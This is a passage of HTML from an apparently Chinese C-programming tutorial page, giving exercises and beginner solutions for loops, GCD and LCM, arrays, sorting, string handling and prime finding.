class="line">#include &lt;stdio.h&gt; </span><br><span class="line"></span><br><span class="line">int sum(int n);</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    printf(&quot;%d\n&quot;,sum(100));</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int sum(int n)&#123;</span><br><span class="line">    int result = 0;</span><br><span class="line">    int i = 1;</span><br><span class="line">    while(i&lt;=n)&#123;</span><br><span class="line">        result += i;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Example 02：[ do…while 语句实现 ]</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line"></span><br><span class="line">int sum(int n);</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    printf(&quot;%d\n&quot;,sum(100));</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int sum(int n)&#123;</span><br><span class="line">    int result = 0;</span><br><span class="line">    int i = 1;</span><br><span class="line">    do&#123;</span><br><span class="line">        result += i;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;while(i&lt;=n);</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Example 03：[ for 语句实现 ]</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line"></span><br><span class="line">int sum(int n);</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    printf(&quot;%d\n&quot;,sum(100));</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int sum(int n)&#123;</span><br><span class="line">    int result = 0;</span><br><span class="line">    int i;</span><br><span class="line">    for(i=1;i&lt;=n;i++)&#123;</span><br><span class="line">        result += i;</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="014-输出以下4-5的矩阵"><a href="#014-输出以下4-5的矩阵" class="headerlink" title="014 输出以下4*5的矩阵"></a>014 输出以下4*5的矩阵</h2><p>【题目】输出以下4*5的矩阵</p><p>1 2 3 4 5</p><p>2 4 6 8 10</p><p>3 6 9 12 15</p><p>4 8 12 16 20</p><p>【代码】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int i,j;</span><br><span class="line">    for(i=1;i&lt;=4;i++)&#123;</span><br><span class="line">        for(j=1;j&lt;=5;j++)&#123;</span><br><span class="line">            printf(&quot;%d\t&quot;,i*j);</span><br><span class="line">            if(j%5 == 0)&#123;</span><br><span class="line">                printf(&quot;\n&quot;);</span><br><span class="line">            &#125;        </span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot;\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="015-求最大公约数和最小公倍数"><a href="#015-求最大公约数和最小公倍数" class="headerlink" title="015 求最大公约数和最小公倍数"></a>015 求最大公约数和最小公倍数</h2><p>【题目】输入两个正整数m和n，求其最大公约数和最小公倍数</p><p>【思路】</p><ul><li><p>思路一：辗转相除法</p><ul><li>有两整数a和b：</li><li>① a%b得余数c</li><li>② 若c&#x3D;0，则b即为两数的最大公约数</li><li>③ 若c≠0，则a&#x3D;b，b&#x3D;c，再回去执行①</li></ul></li><li><p>思路二：相减法</p><ul><li>有两整数a和b：</li><li>① 若a&gt;b，则a&#x3D;a-b</li><li>② 若a&lt;b，则b&#x3D;b-a</li><li>③ 若a&#x3D;b，则a（或b）即为两数的最大公约数</li><li>④ 若a≠b，则再回去执行①</li></ul></li><li><p>思路三：穷举法</p><ul><li>① i&#x3D; a(或b)</li><li>② 若a，b能同时被i整除，则i即为最大公约数，结束</li><li>③ i–，再回去执行②</li></ul></li></ul><p>【代码】</p><ul><li>Example 01：[ 辗转相除法求最大公约数 ]</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int m,n,a,b,c;</span><br><span class="line">    scanf(&quot;%d,%d&quot;,&amp;m,&amp;n);</span><br><span class="line">    a = m;</span><br><span class="line">    b = n;</span><br><span class="line">    // 辗转相除法求最大公约数 </span><br><span class="line">    while(b)&#123;</span><br><span class="line">        c = a%b;</span><br><span class="line">        a = b;</span><br><span class="line">        b = c;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;最大公约数为%d\n&quot;,a);</span><br><span class="line">    //最小公倍数=两整数的乘积÷最大公约数</span><br><span class="line">    printf(&quot;最小公倍数为%d\n&quot;,m*n/a);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Example 02：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line"></span><br><span class="line">int gcd(int a,int b);</span><br><span class="line"> </span><br><span class="line">int main()&#123;</span><br><span class="line">    int m,n;</span><br><span class="line">    scanf(&quot;%d,%d&quot;,&amp;m,&amp;n);</span><br><span class="line">    int a = gcd(m,n);</span><br><span class="line">    printf(&quot;最大公约数为%d\n&quot;,a);</span><br><span class="line">    //最小公倍数=两整数的乘积÷最大公约数</span><br><span class="line">    printf(&quot;最小公倍数为%d\n&quot;,m*n/a);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">//求最大公约数</span><br><span class="line">int gcd(int a,int b)</span><br><span class="line">&#123;</span><br><span class="line">    int c;</span><br><span class="line">    // 辗转相除法求最大公约数 </span><br><span class="line">    while(b)&#123;</span><br><span class="line">        c = a%b;</span><br><span class="line">        a = b;</span><br><span class="line">        b = c;</span><br><span class="line">    &#125;</span><br><span class="line">    return a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Example 03：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line"></span><br><span class="line">int gcd(int a,int b);</span><br><span class="line"> </span><br><span class="line">int main()&#123;</span><br><span class="line">    int m,n;</span><br><span class="line">    scanf(&quot;%d,%d&quot;,&amp;m,&amp;n);</span><br><span class="line">    int a = gcd(m,n);</span><br><span class="line">    printf(&quot;最大公约数为%d\n&quot;,a);</span><br><span class="line">    //最小公倍数=两整数的乘积÷最大公约数</span><br><span class="line">    printf(&quot;最小公倍数为%d\n&quot;,m*n/a);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">//求最大公约数</span><br><span class="line">int gcd(int a,int b)</span><br><span class="line">&#123;</span><br><span class="line">    int g;</span><br><span class="line">    if(b==0)g=a;</span><br><span class="line">    else g=gcd(b,a%b);</span><br><span class="line">    return g;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Example 04：[相减法]</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line"></span><br><span class="line">int gcd(int a,int b);</span><br><span class="line"> </span><br><span class="line">int main()&#123;</span><br><span class="line">    int m,n;</span><br><span class="line">    scanf(&quot;%d,%d&quot;,&amp;m,&amp;n);</span><br><span class="line">    int a = gcd(m,n);</span><br><span class="line">    printf(&quot;最大公约数为%d\n&quot;,a);</span><br><span class="line">    //最小公倍数=两整数的乘积÷最大公约数</span><br><span class="line">    printf(&quot;最小公倍数为%d\n&quot;,m*n/a);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">//求最大公约数</span><br><span class="line">int gcd(int a,int b)</span><br><span class="line">&#123;</span><br><span class="line">    // 相减法求最大公约数 </span><br><span class="line">    while(a != b)&#123;</span><br><span class="line">        if(a&gt;b)&#123;</span><br><span class="line">            a -= b;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            b -= a;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Example 05：[穷举法]</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line"></span><br><span class="line">int gcd(int a,int b);</span><br><span class="line"> </span><br><span class="line">int main()&#123;</span><br><span class="line">    int m,n;</span><br><span class="line">    scanf(&quot;%d,%d&quot;,&amp;m,&amp;n);</span><br><span class="line">    int a = gcd(m,n);</span><br><span class="line">    printf(&quot;最大公约数为%d\n&quot;,a);</span><br><span class="line">    //最小公倍数=两整数的乘积÷最大公约数</span><br><span class="line">    printf(&quot;最小公倍数为%d\n&quot;,m*n/a);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">//求最大公约数</span><br><span class="line">int gcd(int a,int b)</span><br><span class="line">&#123;</span><br><span class="line">    int c;</span><br><span class="line">    // 穷举法求最大公约数 </span><br><span class="line">    for(c=a;c&gt;0;c--)&#123;</span><br><span class="line">        if(a%c==0&amp;&amp;b%c==0)&#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="016-数组元素逆序输出"><a href="#016-数组元素逆序输出" class="headerlink" title="016 数组元素逆序输出"></a>016 数组元素逆序输出</h2><p>【题目】对10个数组元素依次赋值为0,1,2,3,4,5,6,7,8,9 要求按逆序输出</p><p>【代码】</p><ul><li>Example 01：( 直接赋初值)</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int i,a[10]=&#123;0,1,2,3,4,5,6,7,8,9&#125;;</span><br><span class="line">    </span><br><span class="line">    for(i=9;i&gt;=0;i--)&#123;</span><br><span class="line">        printf(&quot;%d &quot;,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;\n&quot;);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Example 02：( for 循环赋初值)</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int i,a[10];</span><br><span class="line">    for(i=0;i&lt;10;i++)&#123;</span><br><span class="line">        a[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i=9;i&gt;=0;i--)&#123;</span><br><span class="line">        printf(&quot;%d &quot;,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;\n&quot;);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>## 017 数组求Fibonacci数列问题</p><p>【题目】使用数组求Fibonacci数列问题</p><p>【代码】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#define _Max 20</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int i;</span><br><span class="line">    int f[_Max]=&#123;1,1&#125;;</span><br><span class="line">    for(i=2;i&lt;_Max;i++)&#123;</span><br><span class="line">        f[i] = f[i-2] + f[i-1];</span><br><span class="line">    &#125;</span><br><span class="line">    for(i=0;i&lt;_Max;i++)&#123;</span><br><span class="line">        if(i%5==0)&#123;</span><br><span class="line">            printf(&quot;\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot;%12d&quot;,f[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;\n&quot;);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="018-对n个数升序排序"><a href="#018-对n个数升序排序" class="headerlink" title="018 对n个数升序排序"></a>018 对n个数升序排序</h2><p>【题目】对n个数按升序排序</p><p>【代码】</p><ul><li>Example 01：( 冒泡法排序 )</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#define N 5</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int a[N];</span><br><span class="line">    int i,j,t;</span><br><span class="line">    printf(&quot;input %d numbers:\n&quot;,N);</span><br><span class="line">    for(i=0;i&lt;N;i++)&#123;</span><br><span class="line">        scanf(&quot;%d&quot;,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;\n&quot;);</span><br><span class="line">    for(i=0;i&lt;N-1;i++)&#123;</span><br><span class="line">        for(j=0;j&lt;N-1-i;j++)&#123;</span><br><span class="line">            if(a[j]&gt;a[j+1])&#123;</span><br><span class="line">                t = a[j];</span><br><span class="line">                a[j] = a[j+1];</span><br><span class="line">                a[j+1] = t;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i=0;i&lt;N;i++)&#123;</span><br><span class="line">        printf(&quot;%d &quot;,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;\n&quot;);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="019-二维数组行列元素互换"><a href="#019-二维数组行列元素互换" class="headerlink" title="019 二维数组行列元素互换"></a>019 二维数组行列元素互换</h2><p>【题目】将一个二维数组行与列的元素互换，存到另一个二维数组中，比如：</p><p>$$ a &#x3D; \left[ \begin{matrix} 1 &amp; 2 &amp; 3 \\ 4 &amp; 5 &amp; 6 \end{matrix} \right] b &#x3D; \left[ \begin{matrix} 1 &amp; 4 \\ 2 &amp; 5 \\ 3 &amp; 6 \end{matrix} \right] $$</p><p>【代码】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#define M 2</span><br><span class="line">#define N 3</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    </span><br><span class="line">    int a[M][N] = &#123;&#123;1,2,3&#125;,&#123;4,5,6&#125;&#125;;</span><br><span class="line">    int b[N][M];</span><br><span class="line">    int i,j;</span><br><span class="line">    printf(&quot;array a：\n&quot;);</span><br><span class="line">    for(i=0;i&lt;M;i++)&#123;</span><br><span class="line">        for(j=0;j&lt;N;j++)&#123;</span><br><span class="line">            printf(&quot;%5d&quot;,a[i][j]);</span><br><span class="line">            b[j][i] = a[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot;\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;array b：\n&quot;);</span><br><span class="line">    for(i=0;i&lt;N;i++)&#123;</span><br><span class="line">        for(j=0;j&lt;M;j++)&#123;</span><br><span class="line">            printf(&quot;%5d&quot;,b[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot;\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="020-输出已知的字符串"><a href="#020-输出已知的字符串" class="headerlink" title="020 输出已知的字符串"></a>020 输出已知的字符串</h2><p>【题目】输出一个已知的字符串。</p><p>【代码】</p><ul><li>Example 01：利用字符数组</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char c[15] = &#123;&#x27;I&#x27;,&#x27; &#x27;,&#x27;a&#x27;,&#x27;m&#x27;&#125;;</span><br><span class="line">    int i;</span><br><span class="line">    for(i=0;i&lt;15;i++)&#123;</span><br><span class="line">        printf(&quot;%c&quot;,c[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><ul><li>Example 02：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char c[15] = &#123;&quot;I am&quot;&#125;;</span><br><span class="line">    printf(&quot;%s\n&quot;,c);</span><br><span class="line">    return 0;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><ul><li>Example 03：使用 puts(str);</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char c[15] = &#123;&quot;I am&quot;&#125;;</span><br><span class="line">    puts(c);</span><br><span class="line">    return 0;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="021-统计单词个数"><a href="#021-统计单词个数" class="headerlink" title="021 统计单词个数"></a>021 统计单词个数</h2><p>【题目】输入一行字符，统计其中有多少个单词，单词之间用空格分隔开。</p><p>【思路】</p><p><img src="https://wugenqiang.github.io/PictureBed/CS-Notes/20200316113622.jpg"></p><p>【代码】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char string[81];</span><br><span class="line">    int i,num = 0,word = 0;</span><br><span class="line">    char c;</span><br><span class="line">    gets(string);</span><br><span class="line">    for(i=0;(c=string[i])!=&#x27;\0&#x27;;i++)&#123;</span><br><span class="line">        if(c == &#x27; &#x27;)&#123;</span><br><span class="line">            word = 0;</span><br><span class="line">        &#125;else if(word == 0)&#123;</span><br><span class="line">            word = 1;</span><br><span class="line">            num++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;There are %d words in this line.\n&quot;,num);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="022-字符串中找最大者"><a href="#022-字符串中找最大者" class="headerlink" title="022 字符串中找最大者"></a>022 字符串中找最大者</h2><p>【题目】有3个字符串，要求找出其中最大者</p><p>【思路】</p><p><img src="https://wugenqiang.github.io/PictureBed/CS-Notes/20200316122120.jpg"></p><p>【代码】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt; </span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char str[3][20];    //定义二维字符数组 </span><br><span class="line">    char string[20];    //定义一维字符数组，作为交换字符串时候的临时字符数组     </span><br><span class="line">    int i;</span><br><span class="line">    for(i=0;i&lt;3;i++)&#123;</span><br><span class="line">        gets(str[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    if(strcmp(str[0],str[1])&gt;0)&#123;</span><br><span class="line">        strcpy(string,str[0]);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        strcpy(string,str[1]);</span><br><span class="line">    &#125;</span><br><span class="line">    if(strcmp(str[2],string)&gt;0)&#123;</span><br><span class="line">        strcpy(string,str[2]);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;\nThe largest string is：%s\n&quot;,string);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="023-筛选法求素数"><a href="#023-筛选法求素数" class="headerlink" title="023 筛选法求素数"></a>023 筛选法求素数</h2><p>【题目】用筛选法求 100 之内的素数</p><p>【代码】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;string.h&gt; </span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int i,j,a[100];</span><br><span class="line">    for(i=2;i&lt;100;i++)&#123;</span><br><span class="line">        a[i] = i;</span><br><span class="line">        for(j=2;j&lt;=i;j++)&#123;</span><br><span class="line">            if(j&lt;i &amp;&amp; a[i]%j==0)&#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            if(a[i] == j)&#123;</span><br><span class="line">                printf(&quot;%5d&quot;,a[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="024-选择法排序"><a href="#024-选择法排序" class="headerlink" title="024 选择法排序"></a>024 选择法排序</h2><p>【题目】用选择法对 10 个整数排序</p><p>【代码】</p><ul><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt; </span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int 